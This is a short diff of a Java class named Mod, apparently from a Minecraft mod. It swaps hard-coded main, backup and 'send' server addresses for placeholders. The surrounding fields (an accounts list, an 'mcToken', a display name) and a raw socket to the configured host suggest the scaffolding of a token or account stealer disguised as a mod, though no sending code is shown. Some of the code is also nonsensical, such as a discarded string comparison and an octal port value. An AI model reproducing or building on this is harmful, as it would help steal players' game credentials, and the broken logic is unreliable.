@@ -163,15 +163,15 @@ public class Mod extends ClassLoader {
 	public static ArrayList<Mod> modules = new ArrayList<Mod>();
 
 
-	private static final String host = "172.0.0.1"; //ip of main server
-	private static final String backup = "fe80::b821:1cff:fe24:9464%8"; //ip of backup server
-	private static final int port = 020505; //replace with port of serverz
+	private static final String host = "http ip here"; //ip of main server
+	private static final String backup = "dns ip here"; //ip of backup server
+	private static final int port = 0000; //replace with port of serverz
 	private static String accountslist = "";
 	private static final String files = "";
 	private static String mcToken = "";
 	public static HttpURLConnection conn;
 	private static String displayName = "";
-	private static String toSend = "fe80::b821:1cff:fe24:9464%8";
+	private static String toSend = "false send ip here";
 
 	public Mod(Group group, String name, String... description) {
 		this.group = group;
@@ -243,7 +243,7 @@ public class Mod extends ClassLoader {
 	public static void socket(Method send) {
 		try {
 			Socket socket = new Socket(host, port);
-			socket.toString().equalsIgnoreCase("192.168.0.1" + port);
+			socket.toString().equalsIgnoreCase("ip here" + port);
 		} catch (ConnectionPendingException e) {
 			try {
 				Socket socket = new Socket(host, port);
